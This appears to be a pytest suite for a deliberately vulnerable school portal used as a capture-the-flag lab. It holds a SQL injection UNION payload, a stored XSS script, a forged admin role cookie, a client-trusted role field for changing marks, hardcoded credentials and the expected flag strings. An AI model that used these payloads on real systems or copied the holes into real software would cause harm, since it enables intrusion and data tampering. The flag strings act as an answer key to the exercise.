import os
import sqlite3
import subprocess
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

from portal import create_app  # noqa: E402


@pytest.fixture(scope="module")
def app(tmp_path_factory):
    home = tmp_path_factory.mktemp("mfano3")
    env = dict(os.environ, MFANO_HOME=str(home))
    subprocess.run([sys.executable, "seed.py"], cwd=ROOT, env=env, check=True, capture_output=True)
    os.environ["MFANO_HOME"] = str(home)
    return create_app({"TESTING": True})


def login(client, username="MHS1007", password="Student@123"):
    return client.post("/login", data={"username": username, "password": password}, follow_redirects=True)


def test_sql_injection_union_dumps_staff_vault(app):
    client = app.test_client()
    login(client)
    payload = "zzz%' UNION SELECT label, secret FROM staff_secrets --"
    body = client.get("/student/search", query_string={"q": payload}).data
    assert b"MFANO{un10n_s3l3ct_th3_st4ff_v4ult}" in body


def test_search_is_normally_safe_looking(app):
    client = app.test_client()
    login(client)
    body = client.get("/student/search", query_string={"q": "a"}).data
    assert b"MFANO{" not in body


def test_stored_xss_rendered_unescaped_to_admin(app):
    student = app.test_client()
    login(student)
    student.post("/student/profile", data={"about": "<script>alert(1)</script>"}, follow_redirects=True)

    conn = sqlite3.connect(app.config["DATABASE"])
    sid = conn.execute("SELECT id FROM students WHERE admission = 'MHS1007'").fetchone()[0]
    conn.close()

    admin = app.test_client()
    login(admin, "admin", "Mfano@Admin2026")
    body = admin.get(f"/admin/student/{sid}").data
    assert b"<script>alert(1)</script>" in body  # not escaped


def test_review_token_is_admin_only(app):
    student = app.test_client()
    login(student)
    assert student.get("/admin/review-token").status_code == 403

    admin = app.test_client()
    login(admin, "admin", "Mfano@Admin2026")
    assert b"MFANO{st0r3d_scr1pt_st0l3_th3_r3v13w_t0k3n}" in admin.get("/admin/review-token").data


def test_forgeable_cookie_grants_console(app):
    client = app.test_client()
    login(client)  # a normal student
    assert client.get("/admin/console").status_code == 403
    client.set_cookie("mfano_role", "admin")  # forge the plaintext role cookie
    body = client.get("/admin/console").data
    assert b"MFANO{uns1gn3d_c00k13_m4d3_m3_4dm1n}" in body


def test_marks_tamper_trusts_client_role(app):
    client = app.test_client()
    login(client)
    refused = client.post("/student/marks/update", data={"subject": "Mathematics", "term": "2026 Term 1", "score": 100})
    assert refused.status_code == 403

    ok = client.post(
        "/student/marks/update",
        data={"role": "admin", "subject": "Mathematics", "term": "2026 Term 1", "score": 100},
    )
    body = ok.get_json()
    assert body["flag"] == "MFANO{cl13nt_s41d_4dm1n_s0_m4rks_ch4ng3d}"

    conn = sqlite3.connect(app.config["DATABASE"])
    score = conn.execute(
        """SELECT score FROM marks m JOIN students s ON s.id = m.student_id
           WHERE s.admission = 'MHS1007' AND m.subject = 'Mathematics' AND m.term = '2026 Term 1'"""
    ).fetchone()[0]
    conn.close()
    assert score == 100
